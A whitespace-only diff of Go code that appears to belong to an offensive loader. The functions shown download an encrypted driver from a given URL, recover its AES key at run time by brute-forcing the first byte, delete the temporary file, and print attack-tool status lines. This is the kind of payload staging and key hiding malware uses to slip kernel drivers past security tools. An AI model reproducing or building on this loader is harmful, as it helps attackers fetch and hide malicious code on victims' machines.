@@ -120,7 +120,7 @@ func BruteForceDecryptDriver(encryptedPath, outputPath string) (bool, error) {
 	// Create base key for brute forcing (first byte starts at 0x00)
 	baseKey := make([]byte, KEYSIZE)
 	copy(baseKey, BruteForceAESKey)
-	
+
 	// Zero IV as used in your encrypt.py
 	iv := make([]byte, IVSIZE)
 
@@ -156,7 +156,7 @@ func BruteForceDecryptDriver(encryptedPath, outputPath string) (bool, error) {
 // DownloadAndDecryptDriver - Complete workflow: download + brute force decrypt
 func DownloadAndDecryptDriver(downloadURL, tempPath, outputPath string) error {
 	fmt.Printf("[*] Downloading encrypted driver from: %s\n", downloadURL)
-	
+
 	// Download encrypted driver
 	if err := DownloadFile(downloadURL, tempPath); err != nil {
 		return fmt.Errorf("download failed: %v", err)
@@ -164,13 +164,13 @@ func DownloadAndDecryptDriver(downloadURL, tempPath, outputPath string) error {
 	defer os.Remove(tempPath) // Clean up temp file
 
 	fmt.Printf("[*] Starting brute force decryption...\n")
-	
+
 	// Brute force decrypt the driver
 	success, err := BruteForceDecryptDriver(tempPath, outputPath)
 	if err != nil {
 		return fmt.Errorf("decryption failed: %v", err)
 	}
-	
+
 	if !success {
 		return fmt.Errorf("no valid driver found after brute force decryption")
 	}
